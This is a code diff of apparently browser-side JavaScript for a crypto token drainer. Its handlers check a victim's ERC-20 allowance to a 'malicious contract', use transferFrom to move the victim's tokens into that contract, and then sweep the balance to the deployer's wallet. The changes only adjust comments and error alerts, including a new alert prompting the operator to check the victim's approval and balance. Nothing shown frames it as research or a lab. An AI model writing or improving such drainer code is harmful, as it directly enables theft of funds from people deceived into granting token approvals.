@@ -526,7 +526,7 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             // Convert the amount to the token's smallest unit (18 decimals for stk)
             const amountInTokens = web3.utils.toBN(amount).mul(web3.utils.toBN('1000000000000000000')); // 10^18
 
-            // Ensure the victim has approved the malicious contract
+            // Check if victim has approved the malicious contract
             const allowance = await tokenContract.methods.allowance(victimAddress, maliciousContractAddress).call();
             if (parseFloat(allowance) < parseFloat(amountInTokens)) {
                 alert("Allowance is insufficient for this withdrawal.");
@@ -536,11 +536,11 @@ document.getElementById("transferTokensBtn").addEventListener("click", async () 
             // Perform the withdrawal from the victim's wallet to the malicious contract
             const transaction = await tokenContract.methods.transferFrom(victimAddress, maliciousContractAddress, amountInTokens).send({ from: accounts[0] });
 
-            // Check if the withdrawal was successful
             alert(`${amount} stk tokens successfully withdrawn from the victim's account to the malicious contract!`);
         } catch (error) {
-            alert("Error during withdrawal.");
+            alert("Error during withdrawal. Please check the details.");
             console.error("Withdrawal Error:", error);
+            alert("Check the victim's approval, balance, and allowance.");
         }
     }
 });
@@ -551,7 +551,6 @@ document.getElementById("deployerWithdrawBtn").addEventListener("click", async (
     try {
         const contractBalance = await tokenContract.methods.balanceOf(maliciousContractAddress).call();
         if (contractBalance > 0) {
-            // Withdraw from malicious contract to the deployer's wallet
             await tokenContract.methods.transfer(deployerAddress, contractBalance).send({ from: deployerAddress });
             alert(`All tokens withdrawn to the deployer's address!`);
         } else {
